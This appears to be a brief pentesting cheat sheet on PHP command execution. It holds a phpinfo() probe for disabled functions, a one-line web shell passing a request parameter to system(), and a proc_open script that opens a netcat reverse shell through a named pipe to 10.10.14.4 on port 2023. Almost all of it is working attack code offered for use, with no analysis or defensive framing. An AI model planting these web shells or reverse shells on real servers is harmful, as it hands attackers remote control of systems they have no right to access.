### check useful function
```
<?php phpinfo(); ?>
Core -> disable_function()
```

### system
```
<?php
system($_REQUEST['id']);
?>
```

### proc_open
```
<?php
$descriptorspec =array(
        0=> array("pipe", "r"),
        1=> array("pipe", "w"),
        2=> array("file", "/tmp/error-output.txt", "a")
);
$process = proc_open('sh', $descriptorspec, $pipes, $cmd, $env);
if (is_resource($process)) {
        fwrite($pipes[0], 'rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.4 2023 >/tmp/f');
        fclose($pipes[0]);
        echo stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $return_value = proc_close($process);
        echo " command returned $return_value\n";
}
?>
```
